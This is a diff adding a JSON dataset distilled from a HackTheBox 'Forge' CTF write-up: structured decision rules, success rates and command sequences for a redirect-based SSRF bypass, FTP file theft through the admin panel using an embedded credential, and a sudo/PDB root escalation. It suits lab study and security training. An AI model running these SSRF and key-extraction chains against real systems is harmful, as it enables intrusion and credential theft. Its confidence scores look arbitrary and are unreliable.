@@ -1,0 +1,864 @@
+{
+  "writeup_id": "Htb_Forge",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_ssrf_to_privilege_escalation",
+    "primary_services": [
+      "http",
+      "ssh",
+      "ftp"
+    ],
+    "port_signature": "22+80+21",
+    "service_combination": "ssh+http+ftp_filtered",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "ssrf_bypass",
+    "privilege_path": "ssrf_to_ftp_to_ssh_to_sudo",
+    "attack_complexity": "medium",
+    "estimated_time": "90-120 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "url_upload_functionality",
+      "localhost_admin_panel",
+      "filtered_ftp_port",
+      "python_requests_user_agent",
+      "redirect_based_ssrf_bypass"
+    ],
+    "environmental_clues": [
+      "python_flask_application",
+      "apache_frontend",
+      "ubuntu_20_04_focal",
+      "admin_subdomain_vhost",
+      "image_upload_gallery"
+    ],
+    "similar_scenarios": [
+      "forge_htb_medium",
+      "ssrf_web_challenges"
+    ],
+    "unique_aspects": [
+      "dual_ssrf_vulnerabilities",
+      "ftp_file_retrieval_via_ssrf",
+      "python_pdb_privilege_escalation",
+      "redirect_proxy_bypass_technique"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "SSRF_via_redirect",
+        "success_reason": "Server-side request forgery bypassed URL filtering through HTTP redirect",
+        "prerequisite_indicators": [
+          "url_upload_functionality_exists",
+          "server_makes_outbound_requests",
+          "blacklist_filtering_present",
+          "python_requests_user_agent"
+        ],
+        "recognition_patterns": [
+          "upload from URL feature available",
+          "error messages indicating blocked URLs",
+          "python-requests user agent in logs",
+          "localhost-only admin interfaces"
+        ],
+        "failure_modes": [
+          "whitelist_filtering_implemented",
+          "no_redirect_following",
+          "request_validation_too_strict",
+          "network_segmentation_blocks_internal"
+        ],
+        "environmental_factors": [
+          "python_flask_application",
+          "blacklist_based_filtering",
+          "redirect_following_enabled",
+          "internal_services_accessible"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "FTP_access_via_SSRF",
+        "success_reason": "SSRF allowed access to filtered FTP service behind firewall",
+        "prerequisite_indicators": [
+          "ftp_port_filtered_externally",
+          "ssrf_vulnerability_confirmed",
+          "internal_network_access_possible"
+        ],
+        "recognition_patterns": [
+          "filtered FTP port in nmap",
+          "successful SSRF to admin panel",
+          "admin interface shows FTP management"
+        ],
+        "failure_modes": [
+          "ftp_service_not_running",
+          "credentials_required",
+          "protocol_restrictions"
+        ],
+        "environmental_factors": [
+          "firewall_blocks_external_ftp",
+          "internal_ftp_service_running",
+          "admin_panel_ftp_integration"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "PDB_privilege_escalation",
+        "success_reason": "Python debugger exploitation through sudo script execution",
+        "prerequisite_indicators": [
+          "sudo_python_script_access",
+          "pdb_debugger_usage",
+          "script_crash_possible"
+        ],
+        "recognition_patterns": [
+          "sudo -l shows python script",
+          "script uses PDB for debugging",
+          "controlled crash conditions"
+        ],
+        "failure_modes": [
+          "no_sudo_access",
+          "script_hardened_properly",
+          "pdb_disabled_or_restricted"
+        ],
+        "environmental_factors": [
+          "development_environment_practices",
+          "debugging_tools_in_production",
+          "insufficient_sudo_restrictions"
+        ],
+        "success_probability": 0.9,
+        "typical_timeframe": "5-15 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "admin.forge.htb localhost restriction",
+        "discovery_method": "subdomain enumeration and direct access attempt",
+        "why_critical": "Indicated SSRF target and bypass requirement",
+        "how_to_recognize": [
+          "localhost only access messages",
+          "subdomain enumeration results",
+          "different response from main site"
+        ],
+        "follow_up_actions": [
+          "test_ssrf_via_url_upload",
+          "attempt_filter_bypass_techniques",
+          "setup_redirect_server"
+        ]
+      },
+      {
+        "discovery": "python-requests user agent",
+        "discovery_method": "netcat listener during URL upload test",
+        "why_critical": "Confirmed server-side request capability and technology stack",
+        "how_to_recognize": [
+          "python-requests user agent string",
+          "server making outbound connections",
+          "flask/python application indicators"
+        ],
+        "follow_up_actions": [
+          "test_internal_network_access",
+          "attempt_ssrf_payloads",
+          "check_redirect_following"
+        ]
+      },
+      {
+        "discovery": "filtered FTP port 21",
+        "discovery_method": "nmap port scan showing filtered state",
+        "why_critical": "Internal service accessible via SSRF for file extraction",
+        "how_to_recognize": [
+          "nmap shows filtered not closed",
+          "common service ports filtered",
+          "firewall blocking external access"
+        ],
+        "follow_up_actions": [
+          "access_via_ssrf",
+          "enumerate_ftp_contents",
+          "extract_sensitive_files"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "anonymous_web_access",
+        "escalation_method": "SSRF_to_admin_panel",
+        "why_possible": "URL upload feature with redirect following bypassed filtering",
+        "recognition_signs": [
+          "url_upload_functionality",
+          "localhost_restricted_admin",
+          "redirect_following_enabled"
+        ],
+        "exploitation_path": "URL Upload → HTTP Redirect → Admin Panel Access"
+      },
+      {
+        "privilege_level": "admin_panel_access",
+        "escalation_method": "FTP_file_extraction",
+        "why_possible": "Admin panel provided FTP management with internal network access",
+        "recognition_signs": [
+          "admin_panel_ftp_features",
+          "internal_network_connectivity",
+          "file_management_capabilities"
+        ],
+        "exploitation_path": "Admin SSRF → FTP Access → SSH Key Extraction"
+      },
+      {
+        "privilege_level": "user_ssh_access",
+        "escalation_method": "sudo_pdb_exploitation",
+        "why_possible": "User could run Python script with PDB debugger as root",
+        "recognition_signs": [
+          "sudo_python_script_permissions",
+          "pdb_debugger_present",
+          "crash_conditions_controllable"
+        ],
+        "exploitation_path": "SSH Access → sudo script → PDB crash → root shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found HTTP service with SSRF vulnerability and admin site restricted to localhost",
+        "decision": "Test direct SSRF access to restricted resources",
+        "reasoning": "Admin site accessible only from localhost suggests privilege separation",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "directory_enumeration",
+            "when": "if direct SSRF fails"
+          },
+          {
+            "option": "parameter_fuzzing",
+            "when": "if upload functionality limited"
+          }
+        ],
+        "success_indicators": [
+          "admin_site_content_retrieved",
+          "localhost_restriction_bypassed"
+        ],
+        "next_decision": "evaluate_ssrf_filtering"
+      },
+      {
+        "step": 2,
+        "situation": "Direct SSRF blocked by URL filtering",
+        "decision": "Use HTTP redirect bypass via controlled server",
+        "reasoning": "Python requests module follows redirects by default unless explicitly disabled",
+        "confidence": 0.85,
+        "prerequisites": [
+          "external_server_control",
+          "http_redirect_capability"
+        ],
+        "success_indicators": [
+          "redirect_followed_successfully",
+          "admin_content_accessible"
+        ],
+        "failure_fallbacks": [
+          "url_encoding_bypass",
+          "ip_format_variations",
+          "dns_rebinding"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Admin site accessible via redirect bypass",
+        "decision": "Enumerate admin functionality for additional SSRF vectors",
+        "reasoning": "Admin interfaces often have elevated functionality including file access",
+        "confidence": 0.8,
+        "prerequisites": [
+          "admin_site_access"
+        ],
+        "success_indicators": [
+          "ftp_management_found",
+          "file_access_capabilities"
+        ],
+        "next_decision": "exploit_admin_ssrf_for_file_access"
+      },
+      {
+        "step": 4,
+        "situation": "Admin site has FTP management capability",
+        "decision": "Chain SSRF to access internal FTP server",
+        "reasoning": "FTP server filtered from external access but available internally",
+        "confidence": 0.9,
+        "prerequisites": [
+          "admin_ssrf_confirmed",
+          "ftp_service_detected"
+        ],
+        "success_indicators": [
+          "ftp_files_accessible",
+          "user_credentials_found"
+        ],
+        "next_decision": "extract_ssh_credentials"
+      }
+    ],
+    "branching_logic": {
+      "if_direct_ssrf_blocked": {
+        "action": "setup_redirect_server",
+        "tools": [
+          "flask",
+          "python_http_server"
+        ],
+        "next_phase": "redirect_to_admin_site"
+      },
+      "if_admin_access_gained": {
+        "action": "enumerate_admin_functionality",
+        "alternatives": [
+          "ftp_management",
+          "file_upload",
+          "system_commands"
+        ],
+        "decision_criteria": "based_on_available_admin_features"
+      },
+      "if_ftp_access_available": {
+        "action": "extract_sensitive_files",
+        "targets": [
+          "ssh_keys",
+          "user_flags",
+          "configuration_files"
+        ],
+        "tools": [
+          "curl",
+          "custom_redirect_server"
+        ]
+      },
+      "if_ssh_key_obtained": {
+        "action": "authenticate_and_escalate",
+        "next_phase": "privilege_escalation_enumeration"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_redirect_bypass_for_ssrf_filters",
+        "reasoning": "many_applications_follow_redirects_by_default",
+        "applicability": "ssrf_with_url_filtering"
+      },
+      {
+        "rule": "chain_ssrf_vulnerabilities_in_admin_interfaces",
+        "reasoning": "admin_interfaces_often_have_elevated_file_access",
+        "applicability": "admin_panel_access_via_ssrf"
+      },
+      {
+        "rule": "target_internal_services_after_ssrf_bypass",
+        "reasoning": "internal_services_often_less_protected",
+        "applicability": "ssrf_bypass_successful"
+      },
+      {
+        "rule": "prioritize_ftp_enumeration_when_port_filtered",
+        "reasoning": "filtered_ftp_suggests_internal_access_available",
+        "applicability": "ftp_port_filtered_externally"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "SSRF",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_application_with_url_input",
+          "server_side_request_functionality",
+          "python_requests_user_agent"
+        ],
+        "success_indicators": [
+          "url_upload_functionality",
+          "server_fetches_external_urls",
+          "python_requests_user_agent_detected",
+          "localhost_admin_interface_exists"
+        ],
+        "incompatible_with": [
+          "strict_url_validation",
+          "network_egress_filtering",
+          "no_url_input_fields"
+        ],
+        "confidence_boosters": [
+          "admin_subdomain_detected",
+          "localhost_only_services",
+          "redirect_bypass_possible",
+          "internal_service_enumeration"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "15-30 minutes"
+      },
+      {
+        "technique": "FTP_Enumeration",
+        "mitre_id": "T1083",
+        "required_services": [
+          "ftp"
+        ],
+        "required_ports": [
+          21
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "ftp_service_running",
+          "ssrf_access_to_internal_ftp",
+          "filtered_external_ftp_access"
+        ],
+        "success_indicators": [
+          "ftp_port_filtered_externally",
+          "internal_ftp_accessible_via_ssrf",
+          "file_enumeration_possible"
+        ],
+        "incompatible_with": [
+          "ftp_authentication_required",
+          "no_internal_network_access",
+          "ftp_service_disabled"
+        ],
+        "confidence_boosters": [
+          "anonymous_ftp_access",
+          "user_files_accessible",
+          "ssh_keys_in_ftp"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "Python_PDB_Privilege_Escalation",
+        "mitre_id": "T1068",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "python_script_with_sudo_access",
+          "pdb_debugger_accessible",
+          "script_crash_controllable"
+        ],
+        "success_indicators": [
+          "sudo_python_script_execution",
+          "pdb_debugger_triggers_on_crash",
+          "root_shell_via_debugger"
+        ],
+        "incompatible_with": [
+          "no_sudo_access",
+          "python_script_hardened",
+          "debugger_disabled"
+        ],
+        "confidence_boosters": [
+          "user_ssh_access_obtained",
+          "sudo_l_shows_python_script",
+          "script_uses_pdb_module"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "5-10 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application_ssrf": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "python-requests"
+        ],
+        "functionality_indicators": [
+          "url_upload",
+          "image_upload",
+          "fetch_external_content"
+        ],
+        "confidence_threshold": 0.8
+      },
+      "internal_ftp_service": {
+        "port_indicators": [
+          21
+        ],
+        "service_indicators": [
+          "ftp"
+        ],
+        "access_indicators": [
+          "filtered_external",
+          "accessible_internal"
+        ],
+        "confidence_threshold": 0.7
+      },
+      "python_environment": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh"
+        ],
+        "os_indicators": [
+          "ubuntu",
+          "linux"
+        ],
+        "privilege_indicators": [
+          "sudo_python_script"
+        ],
+        "confidence_threshold": 0.75
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "ssrf_localhost_bypass",
+          "when": "url_upload_functionality_detected",
+          "reason": "direct_path_to_admin_interface_access"
+        },
+        {
+          "attack": "redirect_based_ssrf_bypass",
+          "when": "ssrf_filtering_detected",
+          "reason": "common_bypass_technique_high_success"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "ftp_enumeration_via_ssrf",
+          "when": "internal_ftp_service_detected",
+          "reason": "potential_file_access_and_credential_discovery"
+        },
+        {
+          "attack": "python_pdb_exploitation",
+          "when": "ssh_access_and_sudo_python_detected",
+          "reason": "reliable_privilege_escalation_method"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "time_consuming_with_limited_results"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Server-Side Request Forgery (SSRF)",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -X POST -F 'url={malicious_url}' {target_upload_endpoint}",
+            "actual_command": "curl -X POST -F 'url=http://10.10.14.6/' http://forge.htb/upload",
+            "output_pattern": "Returns link to fetched content",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "Flask redirect server",
+            "command_template": "python3 redirect_server.py",
+            "actual_command": "flask app with redirect routes to bypass SSRF filters",
+            "success_factors": [
+              "requests_follows_redirects",
+              "no_redirect_filtering"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "upload_functionality_with_url_option",
+          "python_requests_module_used",
+          "redirect_following_enabled"
+        ],
+        "success_indicators": [
+          "admin_portal_content_retrieved",
+          "internal_services_accessible",
+          "ftp_credentials_discovered"
+        ],
+        "common_failures": [
+          "redirect_following_disabled",
+          "strict_url_validation",
+          "network_segmentation"
+        ],
+        "follow_up_techniques": [
+          "ftp_enumeration",
+          "credential_harvesting",
+          "file_system_access"
+        ],
+        "time_investment": "15-45 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "SSRF via HTTP Redirect",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "Flask",
+            "command_template": "from flask import Flask, redirect\napp = Flask(__name__)\n@app.route('/')\ndef admin():\n    return redirect('{target_url}')",
+            "actual_command": "return redirect('http://admin.forge.htb/')",
+            "output_pattern": "HTTP 302 redirect response",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "attacker_controlled_webserver",
+          "target_follows_redirects",
+          "bypass_url_filtering"
+        ],
+        "success_indicators": [
+          "internal_admin_portal_accessed",
+          "restricted_content_retrieved",
+          "further_ssrf_endpoints_discovered"
+        ],
+        "common_failures": [
+          "redirect_loops_detected",
+          "redirect_following_disabled",
+          "response_size_limits"
+        ],
+        "follow_up_techniques": [
+          "internal_service_enumeration",
+          "credential_extraction",
+          "chained_ssrf_attacks"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "FTP Enumeration via SSRF",
+        "mitre_id": "T1083",
+        "category": "discovery",
+        "phase": "post_exploitation",
+        "tools_used": [
+          {
+            "name": "SSRF redirect chain",
+            "command_template": "return redirect(f'http://admin.forge.htb/upload?u=ftp://user:password@127.0.0.1/{file_path}')",
+            "actual_command": "return redirect(f'http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/{f}')",
+            "output_pattern": "FTP directory listings and file contents",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "ftp_credentials_known",
+          "admin_upload_endpoint_accessible",
+          "ftp_protocol_support"
+        ],
+        "success_indicators": [
+          "directory_listings_retrieved",
+          "sensitive_files_accessed",
+          "ssh_keys_extracted"
+        ],
+        "common_failures": [
+          "ftp_protocol_not_supported",
+          "credential_authentication_failure",
+          "file_permission_restrictions"
+        ],
+        "follow_up_techniques": [
+          "ssh_key_extraction",
+          "user_flag_retrieval",
+          "privilege_escalation_preparation"
+        ],
+        "time_investment": "20-60 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "Flask redirect server",
+        "use_case": "ssrf_filter_bypass",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "ssrf_exploitation"
+        ],
+        "alternatives": [
+          "nginx_redirect",
+          "apache_redirect",
+          "simple_http_server"
+        ],
+        "best_practices": [
+          "use_parameterized_routes_for_flexibility",
+          "log_all_requests_for_debugging",
+          "handle_url_encoding_properly"
+        ]
+      },
+      {
+        "tool": "curl",
+        "use_case": "ssrf_result_retrieval",
+        "effectiveness_rating": 4,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_exploitation"
+        ],
+        "alternatives": [
+          "wget",
+          "burp_suite",
+          "browser_developer_tools"
+        ],
+        "best_practices": [
+          "follow_redirects_when_needed",
+          "save_responses_for_analysis",
+          "use_appropriate_headers"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "ssrf_to_admin_access",
+        "steps": [
+          {
+            "step": 1,
+            "command": "python3 -c \"from flask import Flask, redirect; app = Flask(__name__); @app.route('/') def admin(): return redirect('http://admin.forge.htb/'); app.run(host='0.0.0.0', port=80)\"",
+            "purpose": "Setup redirect server to bypass SSRF filters",
+            "expected_output": "Flask server running on port 80"
+          },
+          {
+            "step": 2,
+            "command": "curl -X POST -F 'url=http://10.10.14.6/' http://forge.htb/upload",
+            "purpose": "Trigger SSRF via redirect to admin portal",
+            "expected_output": "Link to admin portal content"
+          },
+          {
+            "step": 3,
+            "command": "curl {returned_link}",
+            "purpose": "Retrieve admin portal content",
+            "expected_output": "Admin portal HTML with navigation links"
+          }
+        ],
+        "success_rate": 0.9,
+        "typical_duration": "10-20 minutes"
+      },
+      {
+        "sequence_name": "ftp_enumeration_via_ssrf",
+        "steps": [
+          {
+            "step": 1,
+            "command": "Add route: @app.route('/ftp') def ftp(): return redirect('http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/')",
+            "purpose": "Setup FTP enumeration via admin upload",
+            "expected_output": "New Flask route configured"
+          },
+          {
+            "step": 2,
+            "command": "curl -X POST -F 'url=http://10.10.14.6/ftp' http://forge.htb/upload",
+            "purpose": "Trigger FTP directory listing",
+            "expected_output": "Link to FTP directory contents"
+          },
+          {
+            "step": 3,
+            "command": "curl {returned_link}",
+            "purpose": "Retrieve FTP directory listing",
+            "expected_output": "Directory listing showing user.txt and .ssh folder"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "15-30 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Forge",
+      "difficulty": "Medium",
+      "os": "Linux Ubuntu",
+      "platform": "HackTheBox",
+      "release_date": "2021-09-11",
+      "author": "NoobHacker9999",
+      "estimated_time": "2-3 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "ssrf",
+        "ftp",
+        "python_debugging"
+      ],
+      "key_vulnerabilities": [
+        "server_side_request_forgery",
+        "filter_bypass",
+        "pdb_exploitation"
+      ],
+      "environment_type": "web_application_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "ssrf_exploitation",
+        "redirect_bypass",
+        "pdb_privilege_escalation"
+      ],
+      "prerequisite_knowledge": [
+        "web_application_security",
+        "http_redirects",
+        "python_debugging"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "ssrf",
+        "privilege_escalation",
+        "filter_bypass"
+      ],
+      "attack_types": [
+        "server_side_request_forgery",
+        "privilege_escalation",
+        "file_access"
+      ],
+      "defensive_lessons": [
+        "input_validation",
+        "url_filtering",
+        "secure_debugging",
+        "principle_of_least_privilege"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Bucket",
+        "Pikaboo",
+        "Ophiuchi"
+      ],
+      "similarity_reasons": [
+        "ssrf_vulnerabilities",
+        "filter_bypass_techniques",
+        "web_application_focus"
+      ],
+      "unique_aspects": [
+        "redirect_based_ssrf_bypass",
+        "ftp_via_ssrf",
+        "pdb_exploitation"
+      ],
+      "difficulty_factors": [
+        "multi_stage_ssrf",
+        "creative_filter_bypass",
+        "python_debugging_knowledge"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T21:43:14.111582",
+    "original_file": "0xdf_writeups/Htb Forge.md",
+    "content_length": 29398,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
